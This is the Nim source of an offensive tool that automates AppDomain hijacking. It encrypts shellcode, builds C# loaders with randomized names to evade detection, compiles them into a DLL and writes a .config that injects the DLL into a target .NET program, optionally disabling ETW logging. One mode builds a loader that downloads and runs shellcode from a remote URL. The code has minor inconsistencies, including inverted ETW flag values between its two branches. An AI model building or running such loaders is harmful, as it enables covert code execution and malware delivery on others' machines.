#[
    Main binary for automation of AppDomain hijack payloads. For insight on this technique, see: https://attack.mitre.org/techniques/T1574/014/

    Authors:
        nbaertsch
        pr0b3r7
]#

import std/[os, uri, strformat, osproc, strutils, tables, macros]  # os: for file and directory operations
                                                           # uri: for URI handling
                                                           # strformat: for string formatting
                                                           # osproc: for executing OS processes
                                                           # strutils: for string manipulation utilities
                                                           # tables: for using hash tables (dictionaries)

import mustache  # Importing the mustache library for templating
import therapist # Importing the therapist library, used for command line parsing
import ./crypto  # Importing a custom module named 'crypto' based on nimcrypto library for cryptographic operations

macro `*` (a: string, i: int): string =
    quote do:
        var result: string
        for _ in 0..<`i`:
            result = result & `a`
        result

const CONFIG = slurp("../templates/config.mustache")
const HIJACKER_EMBEDDED_PIC = slurp("../templates/hijacker-embedded-pic.mustache")  
const HIJACKER_REMOTE_PIC = slurp("../templates/hijacker-remote-pic.mustache")
const HIJACKER_NO_ALLOC_EMBEDDED_PIC = slurp("../templates/hijacker-no-alloc-embedded-pic.mustache")
const PUMP_FUNC = slurp("../templates/pump-func.mustache")

# Hashmap for embedded mustache templates
let partials = {
  "config": CONFIG,
  "hijacker-embedded-pic": HIJACKER_EMBEDDED_PIC,
  "hijacker-remote-pic": HIJACKER_REMOTE_PIC,
  "hijacker-no-alloc-embedded-pic": HIJACKER_NO_ALLOC_EMBEDDED_PIC,
  "pump-func": PUMP_FUNC
}.toTable()

# The parser is specified as a tuple
let spec = (
    target: newStringArg(@["-t", "--target-name"], required=true, help="Name of the target managed .exe to hijack."),
    hijackName: newStringArg(@["-n", "--hijack-name"], required=true, help="Name of the hijacker .dll."),
    shellcodeUrl: newStringArg(@["-u", "--url"], help="URL of the remote shellcode to run."),
    shellcodeFile: newStringArg(@["-f", "--file"], help="File containing the shellcode to embed."),
    noAlloc: newFlagArg(@["--no-alloc"], help="Disable memory allocation."),
    outputDirectory: newDirArg(@["-o", "--output"], required=true, help="Full directory to write files to."),
    disableEtw: newBoolArg(@["-e", "--etw"], defaultVal=true, help="Disable ETW."),
    version: newMessageArg(@["--version"], "1.0.0", help="Prints version."),
    help: newHelpArg(@["-h", "--help"], help="Show help message."),
)

when isMainModule:
    spec.parseOrQuit() # parse commandline params

    # validate the target param contains an exe extension
    var (_, targetName, targetExt) = spec.target.value.splitFile()
    if targetExt == "": targetExt = "exe"
    let target = targetName.addFileExt(targetExt)

    # validate the hijack param contains a dll extension
    var (_, hijackName, hijackExt) = spec.hijackName.value.splitFile()
    if hijackExt == "": hijackExt = "dll"
    let hijack = hijackName.addFileExt(hijackExt)

    if not spec.shellcodeFile.seen and not spec.shellcodeUrl.seen:
        echo "Shellcode file or url required!"
        echo "exiting..."
        quit()
    
    # Check if both 'shellcodeFile' and 'shellcodeUrl' options have been provided by the user.
    if spec.shellcodeFile.seen and spec.shellcodeUrl.seen:
        # If both 'shellcodeFile' and 'shellcodeUrl' are specified, inform the user that only one should be provided.
        echo "Cannot specify both shellcode file and url, pick one!"
        # Print an additional message indicating that the program will exit.
        echo "exiting..."
        # Terminate the program because specifying both options is not allowed.
        quit()

    if spec.shellcodeFile.seen:
        ## Embedded shellcode case implementation

        if not fileExists(spec.shellcodeFile.value):
            # if the shellcode file does not exist, exit
            echo "Shellcode file does not exist!"
            echo "exiting..."
            quit()
        
        try: # Attempt to validate the provided URI specified by the 'shellcodeUrl' option.
            discard spec.shellcodeUrl.value.parseUri()
        except Exception as e:
            echo e.msg
            quit()
        
        let key = crypto.randString(32) # Generate a random string of 32 characters to be used as the encryption key.
        let ivstring = crypto.randString(16) # Generate a random string of 16 characters to be used as the initialization vector (IV).

        let iv = cast[ptr array[16, byte]](addr ivstring[0])[] # cast `ivstring` to a byte array for crypto
        let fShellcode = open(spec.shellcodeFile.value)
        let bShellcode = cast[seq[byte]](fShellcode.readAll())
        let encShellcode = bShellcode.encryptBytes(key, iv).encode()
        fShellcode.close()
        
        ## Write the config file
        let fConfig = open(spec.outputDirectory.value / (target & ".config"), fmWrite)
        let hijackFileName = hijackName & ".cs"
        let fHijackCs = open(spec.outputDirectory.value / hijackFileName, fmWrite)

        # Create a new context for template processing.
        var c = newContext()
        c.searchTable(partials)


        # Set variables in the context for template rendering.
        c["managerType"] = hijackName
        c["encShellcode"] = encShellcode
        c["key"] = key
        c["ivstring"] = ivstring
        # Assign randomized values to variables, functions, and class names in the context
        c["class_Helper"] = randName()
        c["func_Run"] = randName()
        c["var_shellcodeString"] = randName()
        c["func_DecryptString"] = randName()
        c["var_codeBytes"] = randName()
        c["var_codeSize"] = randName()
        c["var_threadHandle"] = randName()
        c["var_ivstring"] = randName()
        c["var_ivarray"] = randName()
        c["var_keystring"] = randName()
        c["var_encryptionKey"] = randName()
        c["func_Decrypt"] = randName()
        c["var_encryptedText"] = randName()
        c["var_encryptedBytes"] = randName()
        c["func_DecryptBytes"] = randName()
        c["var_decryptor"] = randName()
        c["var_memoryStream"] = randName()
        c["var_cryptoStream"] = randName()
        c["var_decryptedBytes"] = randName()
        c["var_bytesRead"] = randName()
        c["var_input"] = randName()
        c["func_GetKeyFromString"] = randName()
        c["var_codePtr"] = randName()
        c["class_StringEncryption"] = randName()
        c["class_NativeMethods"] = randName()
        c["pump_func"] = randName()

        if spec.noAlloc.seen:
            # pump_func_body
            c["pump_func_body"] = "{{ >pump-func }}".render(c) * 2
            fHijackCs.write("{{ >hijacker-no-alloc-embedded-pic }}".render(c))
        else:
            fHijackCs.write("{{ >hijacker-embedded-pic }}".render(c))

        fHijackCs.close() # Close the hijack.cs file after writing.

        # Compile the C# source code into a DLL
        var result: tuple[output: string, exitCode: int]
        let compileCmd = &"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:{spec.outputDirectory.value / hijack} {spec.outputDirectory.value / hijackFileName}"""
        result = execCmdEx(compileCmd)

        if result.exitCode != 0:
            # If compilation failed, display error messages and exit
            echo "Compilation of hijacker CS failed!"
            echo "Command: ", compileCmd
            echo "Output:\n", result.output
            echo "Exiting..."
            quit()
        
        # Get the full assembly name with version and signing key token (if any)
        var pwshCmd = &"""powershell -c "$path = Join-Path (Get-Item {spec.outputDirectory.value}).Fullname '{hijack}';([system.reflection.assembly]::loadfile($path)).FullName" """
        result = execCmdEx(pwshCmd)

        # Check if the PowerShell command was successful (exit code 0)
        if result.exitCode != 0:
            # If the PowerShell command failed, display error messages and exit
            echo "Powershell to get the assembly name failed!"
            echo "Command: ", pwshCmd
            echo "Output:\n", result.output
            echo "Exiting..."
            quit()

        ## Write the configuration
        c = newContext()
        c.searchTable(partials)

        # template vars
        c["managerAssemblyFullName"] = result.output.replace("\n", "") 
        c["managerType"] = hijackName

        if spec.disableEtw.value:
            c["etwEnabled"] = "false"  # If ETW is disabled, set 'etwEnabled' to "false"
        else:
            c["etwEnabled"] = "true"   # Otherwise, set 'etwEnabled' to "true"

        fConfig.write("{{ >config }}".render(c))
        fConfig.close()

    elif spec.shellcodeUrl.seen: # If the 'shellcodeUrl' option is provided
        ## Handle the remote URL shellcode option
        try: # Try to validate the URI
            discard spec.shellcodeUrl.value.parseUri()
        except Exception as e:
            echo e.msg
            quit()
        
        # The configuration file name is derived from the target name with a ".config" extension.
        let fConfig = open(spec.outputDirectory.value / (target & ".config"), fmWrite)
        let hijackFileName = hijackName & ".cs"
        let fHijackCs = open(spec.outputDirectory.value / (hijackFileName), fmWrite)  # Open the hijack.cs file for writing.

        # crypto vars
        let key = crypto.randString(32) # Generate a random encryption key of length 32.
        let ivstring = crypto.randString(16) # Generate a random initialization vector (IV) string of length 16.
        let iv = cast[ptr array[16, byte]](addr ivstring[0])[] # cast ivstring to a an array for use in crypto

        let encUrl = toByteSeq(spec.shellcodeUrl.value).encryptBytes(key, iv).encode()

        # Set .cs template variables
        var c = newContext()
        c.searchTable(partials)        
        # Our vars
        c["managerType"] = hijackName
        c["encUrl"] = encUrl
        c["key"] = key
        c["ivstring"] = ivstring
        # Randomized var, func, and class names
        c["class_Helper"] = randName()
        c["func_Run"] = randName()
        c["var_codeUrl"] = randName()
        c["func_DecryptString"] = randName()
        c["var_codeBytes"] = randName()
        c["var_codeSize"] = randName()
        c["var_threadHandle"] = randName()
        c["func_DownloadData"] = randName()
        c["var_url"] = randName()
        c["var_client"] = randName()
        c["var_ivstring"] = randName()
        c["var_ivarray"] = randName()
        c["var_keystring"] = randName()
        c["var_encryptionKey"] = randName()
        c["func_DecryptString"] = randName()
        c["var_encryptedText"] = randName()
        c["var_encryptedBytes"] = randName()
        c["func_DecryptStringFromBytes"] = randName()
        c["var_decryptor"] = randName()
        c["var_memoryStream"] = randName()
        c["var_cryptoStream"] = randName()
        c["var_decryptedBytes"] = randName()
        c["var_bytesRead"] = randName()
        c["var_input"] = randName()
        c["func_GetKeyFromString"] = randName()
        c["var_codePtr"] = randName()
        c["class_StringEncryption"] = randName()
        c["class_NativeMethods"] = randName()

        fHijackCs.write("{{ >hijacker-remote-pic }}".render(c))
        fHijackCs.close()

        # Compile the C#
        var result: tuple[output: string, exitCode: int]
        let compileCmd = &"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:{spec.outputDirectory.value / hijack} {spec.outputDirectory.value / hijackFileName}"""
        result = execCmdEx(compileCmd)

        # Check if the compilation was successful (exit code 0)
        if result.exitCode != 0:
            # If compilation failed, display error messages and exit
            echo "Compilation of hijacker CS failed!"
            echo "Command: ", compileCmd
            echo "Output:\n", result.output
            echo "Exiting..."
            quit()

        # Output the compilation command and result
        #echo compileCmd
        #echo result

        # Get the full assembly name with version and signing key token (if any)
        var pwshCmd = &"""powershell -c "$path = Join-Path (Get-Item {spec.outputDirectory.value}).Fullname '{hijack}';([system.reflection.assembly]::loadfile($path)).FullName" """
        result = execCmdEx(pwshCmd)

        # If the PowerShell command failed, display error messages and exit
        if result.exitCode != 0:
            echo "Powershell to get the assembly name failed!"
            echo "Command: ", pwshCmd
            echo "Output:\n", result.output
            echo "Exiting..."
            quit()

        #echo pwshCmd  # Print the PowerShell command that was executed
        #echo result   # Print the result of executing the PowerShell command

        ## Write the config file
        c = newContext()
        c.searchTable(partials)
        c["managerAssemblyFullName"] = result.output.replace("\n", "") 
        c["managerType"] = hijackName

        if spec.disableEtw.value:
            c["etwEnabled"] = "true"   # If ETW is disabled, set 'etwEnabled' to "true"
        else:
            c["etwEnabled"] = "false"  # Otherwise, set 'etwEnabled' to "false"

        fConfig.write("{{ >config }}".render(c))
        fConfig.close()
